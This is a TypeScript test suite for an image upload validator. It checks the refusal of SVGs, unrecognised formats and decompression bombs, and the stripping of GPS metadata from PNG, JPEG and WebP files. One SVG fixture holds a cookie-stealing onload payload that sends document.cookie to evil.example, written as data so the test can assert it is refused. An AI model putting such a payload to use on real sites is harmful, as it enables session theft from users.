/**
 * The upload validator, and above all the things it REFUSES.
 *
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 * **A VALIDATOR WITH NO REJECTION TEST IS A CHECK THAT CANNOT FAIL.** That is this estate's most
 * common defect class, so the refusals below are the point of this file and the acceptances are
 * the control that proves the refusals are not simply "everything is rejected".
 *
 * Every fixture is BUILT here, byte by byte, rather than read from a committed binary. Three
 * reasons: a checked-in `.jpg` with real GPS in it would be somebody's actual location committed to
 * a public repository; a binary fixture cannot be reviewed in a diff, so nobody would ever notice
 * it drifting; and building the file is the only way to assert that a specific byte at a specific
 * offset survived or did not.
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 */

import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  MAX_UPLOAD_BYTES,
  UploadRejected,
  looksLikeMarkup,
  normalise,
  sniff,
  type RejectionReason,
} from './imagebytes.ts'

/* ------------------------------------------------------------------ fixture builders */

/** CRC-32, so the PNG fixtures are real files rather than ones only our own parser accepts. */
function crc32(bytes: Buffer): number {
  let crc = 0xffffffff
  for (const byte of bytes) {
    crc ^= byte
    for (let i = 0; i < 8; i += 1) crc = crc & 1 ? (crc >>> 1) ^ 0xedb88320 : crc >>> 1
  }
  return (crc ^ 0xffffffff) >>> 0
}

function pngChunk(type: string, data: Buffer): Buffer {
  const head = Buffer.alloc(8)
  head.writeUInt32BE(data.length, 0)
  head.write(type, 4, 'latin1')
  const crc = Buffer.alloc(4)
  crc.writeUInt32BE(crc32(Buffer.concat([head.subarray(4), data])), 0)
  return Buffer.concat([head, data, crc])
}

interface PngOptions {
  readonly width?: number
  readonly height?: number
  /** Ancillary chunks appended between IHDR and IDAT — the metadata the strip must remove. */
  readonly extra?: readonly { type: string; data: Buffer }[]
}

function png(options: PngOptions = {}): Buffer {
  const width = options.width ?? 64
  const height = options.height ?? 48
  const ihdr = Buffer.alloc(13)
  ihdr.writeUInt32BE(width, 0)
  ihdr.writeUInt32BE(height, 4)
  ihdr[8] = 8 // bit depth
  ihdr[9] = 6 // truecolour with alpha
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    pngChunk('IHDR', ihdr),
    ...(options.extra ?? []).map((c) => pngChunk(c.type, c.data)),
    pngChunk('IDAT', Buffer.from([0x78, 0x9c, 0x63, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01])),
    pngChunk('IEND', Buffer.alloc(0)),
  ])
}

/** A byte sequence that would be a latitude in a real EXIF block. Asserted absent after stripping. */
const GPS_MARKER = Buffer.from('GPSLatitude+51.5074', 'latin1')

/** A string appended AFTER the end-of-image marker, asserted absent from the stripped output. */
const FIXTURE_TRAILER = 'appended-after-the-image-GPS-51.5074'

function jpegSegment(marker: number, body: Buffer): Buffer {
  const head = Buffer.alloc(4)
  head[0] = 0xff
  head[1] = marker
  head.writeUInt16BE(body.length + 2, 2)
  return Buffer.concat([head, body])
}

interface JpegOptions {
  readonly width?: number
  readonly height?: number
  readonly withExif?: boolean
  readonly withComment?: boolean
  readonly withIcc?: boolean
}

function jpeg(options: JpegOptions = {}): Buffer {
  const width = options.width ?? 64
  const height = options.height ?? 48

  const sof = Buffer.alloc(15)
  sof[0] = 8 // sample precision
  sof.writeUInt16BE(height, 1)
  sof.writeUInt16BE(width, 3)
  sof[5] = 3 // component count
  // Three component descriptors, three bytes each. Contents are irrelevant to a size read.
  for (let i = 0; i < 3; i += 1) {
    sof[6 + i * 3] = i + 1
    sof[7 + i * 3] = 0x11
    sof[8 + i * 3] = i === 0 ? 0 : 1
  }

  const parts: Buffer[] = [Buffer.from([0xff, 0xd8])]
  // APP0 / JFIF. KEPT by the strip, and asserted so, because dropping it would be this module
  // altering the picture rather than its metadata.
  parts.push(jpegSegment(0xe0, Buffer.concat([Buffer.from('JFIF\0', 'latin1'), Buffer.alloc(9)])))
  if (options.withExif) {
    parts.push(
      jpegSegment(0xe1, Buffer.concat([Buffer.from('Exif\0\0', 'latin1'), GPS_MARKER])),
    )
  }
  if (options.withIcc) {
    parts.push(
      jpegSegment(0xe2, Buffer.concat([Buffer.from('ICC_PROFILE\0', 'latin1'), Buffer.alloc(8, 7)])),
    )
  }
  if (options.withComment) {
    parts.push(jpegSegment(0xfe, Buffer.from('a comment naming the photographer', 'latin1')))
  }
  parts.push(jpegSegment(0xc0, sof))
  parts.push(jpegSegment(0xda, Buffer.alloc(10)))
  parts.push(Buffer.from([0x12, 0x34, 0x56]))
  parts.push(Buffer.from([0xff, 0xd9]))
  return Buffer.concat(parts)
}

function riffChunk(id: string, data: Buffer): Buffer {
  const head = Buffer.alloc(8)
  head.write(id, 0, 'latin1')
  head.writeUInt32LE(data.length, 4)
  const pad = data.length % 2 === 1 ? Buffer.alloc(1) : Buffer.alloc(0)
  return Buffer.concat([head, data, pad])
}

interface WebpOptions {
  readonly width?: number
  readonly height?: number
  readonly withExif?: boolean
  readonly withXmp?: boolean
}

function webp(options: WebpOptions = {}): Buffer {
  const width = options.width ?? 64
  const height = options.height ?? 48

  const vp8x = Buffer.alloc(10)
  // Flags: EXIF (0x08) and XMP (0x04) declared present when the chunks are.
  vp8x[0] = (options.withExif ? 0x08 : 0) | (options.withXmp ? 0x04 : 0)
  vp8x.writeUIntLE(width - 1, 4, 3)
  vp8x.writeUIntLE(height - 1, 7, 3)

  const vp8l = Buffer.alloc(5)
  vp8l[0] = 0x2f
  vp8l.writeUInt32LE((width - 1) | ((height - 1) << 14), 1)

  const chunks: Buffer[] = [riffChunk('VP8X', vp8x), riffChunk('VP8L', vp8l)]
  if (options.withExif) chunks.push(riffChunk('EXIF', GPS_MARKER))
  if (options.withXmp) {
    chunks.push(riffChunk('XMP ', Buffer.from('<x:xmpmeta>51.5074</x:xmpmeta>', 'latin1')))
  }

  const body = Buffer.concat(chunks)
  const header = Buffer.alloc(12)
  header.write('RIFF', 0, 'latin1')
  header.writeUInt32LE(body.length + 4, 4)
  header.write('WEBP', 8, 'latin1')
  return Buffer.concat([header, body])
}

/** Assert that `normalise` refused, and refused for the stated reason. */
function refusal(bytes: Buffer): RejectionReason {
  try {
    normalise(bytes)
  } catch (err) {
    assert.ok(err instanceof UploadRejected, `expected UploadRejected, got ${String(err)}`)
    return err.reason
  }
  assert.fail('the bytes were accepted, but this case exists because they must not be')
}

/* ------------------------------------------------------------------ the refusals */

/**
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 * THE SVG CASES. Serving an SVG from an origin that holds a session is stored XSS, so each of the
 * shapes an SVG can arrive in is refused BY NAME rather than falling through to "unrecognised".
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 */
test('a plain SVG is refused', () => {
  const svg = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="48"><rect width="64" height="48"/></svg>',
    'utf8',
  )
  assert.equal(refusal(svg), 'svg_refused')
})

test('an SVG carrying a script is refused — this is the payload the rule exists for', () => {
  const hostile = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://evil.example/\'+document.cookie)">' +
      '<script>alert(1)</script></svg>',
    'utf8',
  )
  assert.equal(refusal(hostile), 'svg_refused')
})

test('an SVG disguised with a PNG filename and an image/png content type is still refused', () => {
  // The filename and the header are not inputs to `normalise` AT ALL — which is the property being
  // asserted. The bytes are what decide, so dressing them up changes nothing.
  const disguised = Buffer.from(
    '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>',
    'utf8',
  )
  assert.equal(refusal(disguised), 'svg_refused')
})

test('an SVG behind leading whitespace, a comment or a UTF-8 BOM is refused', () => {
  for (const prefix of ['   \n\t', '<!-- a comment -->', '﻿']) {
    const bytes = Buffer.from(`${prefix}<svg xmlns="http://www.w3.org/2000/svg"/>`, 'utf8')
    assert.equal(refusal(bytes), 'svg_refused', `prefix ${JSON.stringify(prefix)} slipped through`)
  }
})

test('a UTF-16 encoded SVG is refused — a browser would still parse it as markup', () => {
  const utf16 = Buffer.concat([
    Buffer.from([0xff, 0xfe]),
    Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"/>', 'utf16le'),
  ])
  assert.equal(refusal(utf16), 'svg_refused')
})

/**
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 * BAD MAGIC BYTES. The format is read from the content, so anything whose leading bytes are not a
 * known signature is refused however it is labelled.
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 */
test('random bytes are refused as an unrecognised format', () => {
  assert.equal(refusal(Buffer.from('this is just a text file, not an image', 'utf8')), 'unrecognised_format')
})

test('an ELF executable, a ZIP and a PDF are all refused', () => {
  const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(64, 0x90)])
  const zip = Buffer.concat([Buffer.from('PK\x03\x04', 'latin1'), Buffer.alloc(64, 1)])
  const pdf = Buffer.concat([Buffer.from('%PDF-1.7', 'latin1'), Buffer.alloc(64, 2)])
  for (const [name, bytes] of [['elf', elf], ['zip', zip], ['pdf', pdf]] as const) {
    assert.equal(refusal(bytes), 'unrecognised_format', `${name} was not refused`)
  }
})

test('a RIFF container that is not WebP — a WAV — is refused', () => {
  // Matching only `RIFF` would accept this. Both the container and the four-character type are
  // checked, so it does not.
  const wav = Buffer.concat([
    Buffer.from('RIFF', 'latin1'),
    Buffer.from([0x24, 0x00, 0x00, 0x00]),
    Buffer.from('WAVEfmt ', 'latin1'),
    Buffer.alloc(32),
  ])
  assert.equal(refusal(wav), 'unrecognised_format')
  assert.equal(sniff(wav), null)
})

test('a PNG signature followed by rubbish is refused, not read as a size', () => {
  const fake = Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.alloc(40, 0xab),
  ])
  assert.equal(refusal(fake), 'dimensions_unreadable')
})

test('a JPEG signature with no frame header is refused', () => {
  const fake = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff]), Buffer.alloc(64, 0)])
  assert.equal(refusal(fake), 'dimensions_unreadable')
})

/* ------------------------------------------------------------------ bounds */

test('an empty upload is refused', () => {
  assert.equal(refusal(Buffer.alloc(0)), 'empty')
})

test('an upload over the byte cap is refused', () => {
  assert.equal(refusal(Buffer.alloc(MAX_UPLOAD_BYTES + 1, 0x41)), 'too_large')
})

/**
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 * THE DECOMPRESSION BOMB, AND IT IS REFUSED ON A FEW HUNDRED BYTES.
 *
 * This fixture is under 200 bytes and declares 60000x60000 — 3.6 billion pixels, roughly 14 GB
 * once something expands it to RGBA. It is refused from the DECLARED header, before any decoding,
 * which is the entire reason the check reads the header rather than the decoded result.
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 */
test('a decompression bomb is refused from its header, while still tiny on disk', () => {
  // 8000x8000 is 64 megapixels — roughly 256 MB expanded to RGBA — and BOTH EDGES ARE LEGAL, so
  // the per-edge bound does not catch it. Only the area bound does. That is precisely why the two
  // are separate checks, and this is the case that fails if the area one is ever removed.
  const bomb = png({ width: 8_000, height: 8_000 })
  assert.ok(bomb.length < 200, `the fixture should be tiny, it is ${bomb.length} bytes`)
  assert.equal(refusal(bomb), 'pixel_budget_exceeded')
})

test('an image with an edge over the maximum is refused by the edge bound first', () => {
  // 60000 square is a bomb too, but it is stopped one check earlier. Asserting the SPECIFIC reason
  // rather than "some refusal" is what keeps the two bounds from silently collapsing into one.
  assert.equal(refusal(png({ width: 60_000, height: 60_000 })), 'dimensions_out_of_range')
  assert.equal(refusal(png({ width: 9_000, height: 10 })), 'dimensions_out_of_range')
})

test('a one-pixel image is refused as too small', () => {
  assert.equal(refusal(png({ width: 1, height: 1 })), 'dimensions_out_of_range')
})

/* ------------------------------------------------------------------ acceptance */

test('a well-formed PNG, JPEG and WebP are each accepted with their true dimensions', () => {
  for (const [name, bytes] of [
    ['png', png({ width: 64, height: 48 })],
    ['jpeg', jpeg({ width: 64, height: 48 })],
    ['webp', webp({ width: 64, height: 48 })],
  ] as const) {
    const result = normalise(bytes)
    assert.equal(result.format, name === 'png' ? 'png' : name === 'jpeg' ? 'jpeg' : 'webp')
    assert.equal(result.width, 64, `${name} width`)
    assert.equal(result.height, 48, `${name} height`)
  }
})

/* ------------------------------------------------------------------ metadata stripping */

/**
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 * THE PRIVACY TESTS. A phone photograph carries GPS to six decimal places; publishing it on a
 * platform that custodies money deanonymises the uploader with a street address attached.
 *
 * Each of these asserts on the BYTES of the output, not on a flag saying stripping happened.
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 */
test('JPEG EXIF is removed, and the GPS bytes are genuinely gone from the output', () => {
  const withGps = jpeg({ withExif: true })
  assert.ok(withGps.includes(GPS_MARKER), 'the fixture must contain the GPS bytes to begin with')

  const result = normalise(withGps)
  assert.ok(
    !result.bytes.includes(GPS_MARKER),
    'the GPS bytes survived the strip — this is a real location leak',
  )
  assert.ok(result.strippedBytes > 0)
  // The picture itself is untouched: same dimensions, and the scan data is still there.
  assert.equal(result.width, 64)
  assert.equal(result.height, 48)
  assert.ok(result.bytes.includes(Buffer.from([0x12, 0x34, 0x56])), 'the scan data was lost')
})

test('a JPEG comment is removed but the JFIF and ICC segments are kept', () => {
  const result = normalise(jpeg({ withExif: true, withComment: true, withIcc: true }))
  assert.ok(!result.bytes.includes(Buffer.from('a comment naming the photographer', 'latin1')))
  // Kept: neither can carry a location, and dropping the colour profile would change the picture.
  assert.ok(result.bytes.includes(Buffer.from('JFIF\0', 'latin1')), 'JFIF was dropped')
  assert.ok(result.bytes.includes(Buffer.from('ICC_PROFILE\0', 'latin1')), 'the ICC profile was dropped')
})

test('PNG text and eXIf chunks are removed, and the colour chunks are kept', () => {
  const withMetadata = png({
    extra: [
      { type: 'eXIf', data: GPS_MARKER },
      { type: 'tEXt', data: Buffer.from('Comment\0taken at home', 'latin1') },
      { type: 'iTXt', data: Buffer.from('XML:com.adobe.xmp\x00\x00\x00\x0051.5074', 'latin1') },
      { type: 'sRGB', data: Buffer.from([0]) },
    ],
  })
  const result = normalise(withMetadata)
  assert.ok(!result.bytes.includes(GPS_MARKER), 'the eXIf chunk survived')
  assert.ok(!result.bytes.includes(Buffer.from('taken at home', 'latin1')), 'the tEXt chunk survived')
  assert.ok(!result.bytes.includes(Buffer.from('com.adobe.xmp', 'latin1')), 'the iTXt chunk survived')
  // Allowlisted, because it decides what the colours mean.
  assert.ok(result.bytes.includes(Buffer.from('sRGB', 'latin1')), 'sRGB was dropped')
  assert.equal(result.width, 64)
})

test('an unknown PNG chunk is dropped, because the allowlist fails closed', () => {
  const result = normalise(png({ extra: [{ type: 'zzZz', data: Buffer.from('invented later') }] }))
  assert.ok(!result.bytes.includes(Buffer.from('invented later', 'latin1')))
})

test('WebP EXIF and XMP chunks are removed and the VP8X flags are cleared with them', () => {
  const withMetadata = webp({ withExif: true, withXmp: true })
  assert.ok(withMetadata.includes(GPS_MARKER))

  const result = normalise(withMetadata)
  assert.ok(!result.bytes.includes(GPS_MARKER), 'the EXIF chunk survived')
  assert.ok(!result.bytes.includes(Buffer.from('xmpmeta', 'latin1')), 'the XMP chunk survived')

  // The flags byte is the half that is easy to forget: leaving EXIF/XMP declared while the chunks
  // are gone produces a file that announces metadata a reader then cannot find.
  const vp8xFlags = result.bytes[20]
  assert.equal(vp8xFlags, 0, 'the VP8X chunk still declares metadata that is no longer present')

  // And the container is still coherent: the RIFF size matches what actually follows it.
  assert.equal(result.bytes.readUInt32LE(4), result.bytes.length - 8, 'the RIFF size is wrong')
  assert.equal(result.width, 64)
  assert.equal(result.height, 48)
})

test('data appended after a JPEG end-of-image marker is discarded', () => {
  // The polyglot case, and the second-EXIF-block case. PNG has always stopped at IEND and WebP
  // rebuilds from parsed chunks, so both discarded this; JPEG kept it until the tail was cut at
  // EOI. Everything a stripper exists to remove can be appended here.
  const appended = Buffer.concat([
    jpeg({ withExif: true }),
    Buffer.from('PK\x03\x04', 'latin1'),
    Buffer.from(`trailing ${FIXTURE_TRAILER}`, 'latin1'),
  ])
  const result = normalise(appended)
  assert.ok(!result.bytes.includes(Buffer.from(FIXTURE_TRAILER, 'latin1')), 'the tail survived')
  assert.ok(!result.bytes.includes(Buffer.from('PK\x03\x04', 'latin1')), 'an archive was appended')
  // The EOI itself is KEPT — a JPEG without one upsets several decoders.
  assert.deepEqual([...result.bytes.subarray(result.bytes.length - 2)], [0xff, 0xd9])
  // And the picture still reads.
  assert.equal(result.width, 64)
  assert.equal(result.height, 48)
})

test('a JPEG with no end-of-image marker is kept rather than thrown away', () => {
  // Truncated, not hostile. Discarding the only copy of somebody's photograph because its last two
  // bytes are missing helps nobody, and `normalise` re-measures afterwards, so a file too damaged
  // to read is still refused on its own merits.
  const whole = jpeg()
  const truncated = whole.subarray(0, whole.length - 2)
  const result = normalise(truncated)
  assert.equal(result.width, 64)
  assert.ok(result.bytes.includes(Buffer.from([0x12, 0x34, 0x56])), 'the scan data was lost')
})

test('stripping is idempotent — a normalised image normalises to itself', () => {
  // This is what makes the content address stable. If a second pass changed the bytes, the same
  // picture would land at two addresses depending on how many times it had been through.
  const once = normalise(jpeg({ withExif: true, withComment: true }))
  const twice = normalise(once.bytes)
  assert.deepEqual(twice.bytes, once.bytes)
  assert.equal(twice.strippedBytes, 0)
})

test('an image with no metadata to remove is passed through unchanged', () => {
  const clean = png()
  const result = normalise(clean)
  assert.deepEqual(result.bytes, clean)
  assert.equal(result.strippedBytes, 0)
})

/* ------------------------------------------------------------------ unit-level helpers */

test('looksLikeMarkup does not fire on binary that merely contains a less-than sign', () => {
  // A false positive here would refuse legitimate photographs, so the check is anchored to the
  // start of the document rather than searching it.
  assert.equal(looksLikeMarkup(png()), false)
  assert.equal(looksLikeMarkup(jpeg()), false)
  assert.equal(looksLikeMarkup(webp()), false)
})

test('sniff identifies each supported format and nothing else', () => {
  assert.equal(sniff(png()), 'png')
  assert.equal(sniff(jpeg()), 'jpeg')
  assert.equal(sniff(webp()), 'webp')
  assert.equal(sniff(Buffer.from('<svg/>', 'utf8')), null)
  assert.equal(sniff(Buffer.alloc(0)), null)
})
